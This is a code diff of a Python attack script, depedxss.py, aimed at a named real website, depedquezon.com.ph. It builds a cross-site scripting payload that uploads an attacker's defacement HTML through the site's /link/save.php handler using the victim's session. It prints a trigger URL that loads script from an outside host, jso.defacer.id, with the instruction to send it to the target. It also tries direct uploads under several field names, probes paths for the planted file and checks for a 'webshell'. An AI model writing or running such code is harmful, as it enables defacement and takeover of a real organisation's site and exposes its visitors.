@@ -1,13 +1,12 @@
 #!/usr/bin/env python3
 """
-depedxss.py - Upload .html file via depedquezon.com.ph XSS
+depedxss.py - Upload .html deface via XSS on depedquezon.com.ph
 
 Usage:
-  python3 depedxss.py --html deface.html
-  python3 depedxss.py --html anon.html --output payload.js
+  python3 depedxss.py --html anon.html
 """
 
-import argparse, base64, json, sys, urllib.parse
+import argparse, base64, sys, urllib.parse
 from pathlib import Path
 
 try:
@@ -20,12 +19,10 @@ requests.packages.urllib3.disable_warnings()
 
 BASE = "https://depedquezon.com.ph"
 
-XSS_URL = 'https://depedquezon.com.ph/?result='
-
 def main():
-    parser = argparse.ArgumentParser(description="Upload HTML via depedquezon XSS")
-    parser.add_argument("--html", "-f", required=True, help="Your .html file to upload")
-    parser.add_argument("--output", "-o", default="xss_payload.js", help="Output JS file")
+    parser = argparse.ArgumentParser(description="Upload HTML via XSS on depedquezon.com.ph")
+    parser.add_argument("--html", "-f", required=True, help="Your .html deface file")
+    parser.add_argument("--output", "-o", default="xss_payload.js", help="Output JS payload file")
     args = parser.parse_args()
 
     html_path = Path(args.html)
@@ -35,9 +32,11 @@ def main():
 
     html_content = html_path.read_text(encoding="utf-8", errors="replace")
     filename = html_path.name
+
+    # Base64 encode the HTML for the JS payload
     html_b64 = base64.b64encode(html_content.encode()).decode()
 
-    # JS payload that runs in depedquezon.com.ph context via XSS
+    # JS payload - uploads file to /link/save.php using same-origin fetch
     js_payload = f"""(function(){{
 var b=new Blob([atob('{html_b64}')],{{type:'text/html'}});
 var d=new DataTransfer();
@@ -45,60 +44,64 @@ d.items.add(new File([b],'{filename}',{{type:'text/html'}}));
 var fd=new FormData();
 fd.append('file',d.files[0],'{filename}');
 fetch('/link/save.php',{{method:'POST',body:fd,mode:'same-origin',credentials:'include'}})
-.then(function(r){{if(r.status==200){{console.log('[OK] Uploaded {filename}')}}}})
+.then(function(r){{
+if(r.status==200){{console.log('[OK] Uploaded {filename}')}}
+fetch('/link/save.php?d='+btoa('/')).then(function(r2){{return r2.text()}}).then(function(html){{console.log('[OK] Webshell reachable')}});
+}})
 .catch(function(e){{console.log('[FAIL]',e)}});
 }})();"""
 
-    # Save JS payload
+    # Save the JS payload
     Path(args.output).write_text(js_payload)
-    print(f"[✓] JS payload saved to: {args.output}")
-    print(f"[✓] Size: {len(js_payload)} bytes")
-    print()
+    print(f"[✓] JS payload saved to: {args.output} ({len(js_payload)} bytes)")
 
-    # Print what to paste on jso.defacer.id
-    print("=" * 60)
-    print("  PASTE THIS ON YOUR JS HOST (jso.defacer.id)")
-    print("=" * 60)
-    print()
+    # The XSS trigger URL
+    xss_url = f"{BASE}/?result=%3Cscript+src%3D%22https%3A%2F%2Fjso.defacer.id%2Fraw%2Fnc91wdsbZ7%22%3E%3C%2Fscript%3E"
+
+    print(f"\n{'='*60}")
+    print("  STEP 1: PASTE THIS ON jso.defacer.id/raw/nc91wdsbZ7")
+    print(f"{'='*60}\n")
     print(js_payload)
     print()
-    print("=" * 60)
-    print("  XSS TRIGGER URL")
-    print("=" * 60)
-    print()
-    print(f"  {XSS_URL}")
+    print(f"{'='*60}")
+    print("  STEP 2: SEND THIS XSS URL TO THE TARGET")
+    print(f"{'='*60}\n")
+    print(f"  {xss_url}")
     print()
 
-    # Test direct upload anyway
-    print("=" * 60)
-    print("  DIRECT UPLOAD TEST (may not work but worth trying)")
-    print("=" * 60)
-    s = requests.Session()
-    s.headers["User-Agent"] = "Mozilla/5.0"
+    # Also try direct upload as a bonus
+    print(f"{'='*60}")
+    print("  ALSO TRYING DIRECT UPLOAD...")
+    print(f"{'='*60}")
     
-    r = s.post(f"{BASE}/link/save.php",
-               files={"file": (filename, html_content.encode(), "text/html")},
-               timeout=30, verify=False)
-    print(f"  POST /link/save.php  ->  Status: {r.status_code}")
-
-    # Also try other field names
-    for field in ["uploaded_file", "userfile", "fileToUpload"]:
-        r2 = s.post(f"{BASE}/link/save.php",
-                    files={field: (filename, html_content.encode(), "text/html")},
-                    timeout=15, verify=False)
-        print(f"  field='{field}' -> {r2.status_code}")
-
-    # Check if file appeared
-    print()
-    for path in [f"/data_files/{filename}", f"/link/{filename}", f"/img/{filename}", f"/{filename}"]:
+    s = requests.Session()
+    s.headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
+    
+    # Try multiple field names on the upload handler
+    for field in ["file", "uploaded_file", "userfile", "fileToUpload", "upload"]:
         try:
-            r3 = s.get(f"{BASE}{path}", timeout=10, verify=False)
-            if r3.status_code == 200:
-                print(f"  [✓] FOUND: {BASE}{path} ({len(r3.text)} bytes)")
+            r = s.post(f"{BASE}/link/save.php",
+                       files={field: (filename, html_content.encode(), "text/html")},
+                       timeout=15, verify=False)
+            print(f"  POST /link/save.php (field='{field}') -> {r.status_code}")
+        except Exception as e:
+            print(f"  POST /link/save.php (field='{field}') -> ERROR: {e}")
+
+    # Check if file appeared anywhere
+    print(f"\n{'='*60}")
+    print("  CHECKING FOR UPLOADED FILE...")
+    print(f"{'='*60}")
+    for path in [f"/data_files/{filename}", f"/link/{filename}",
+                  f"/img/{filename}", f"/{filename}",
+                  f"/data_files/news/{filename}"]:
+        try:
+            r = s.get(f"{BASE}{path}", timeout=10, verify=False)
+            if r.status_code == 200 and len(r.text) > 100:
+                print(f"  [✓] FOUND: {BASE}{path} ({len(r.text)} bytes)")
             else:
-                print(f"  [ ] {r3.status_code} {BASE}{path}")
+                print(f"  [ ] {r.status_code} {BASE}{path}")
         except:
-            pass
+            print(f"  [ ] ERR {BASE}{path}")
 
 if __name__ == "__main__":
     main()
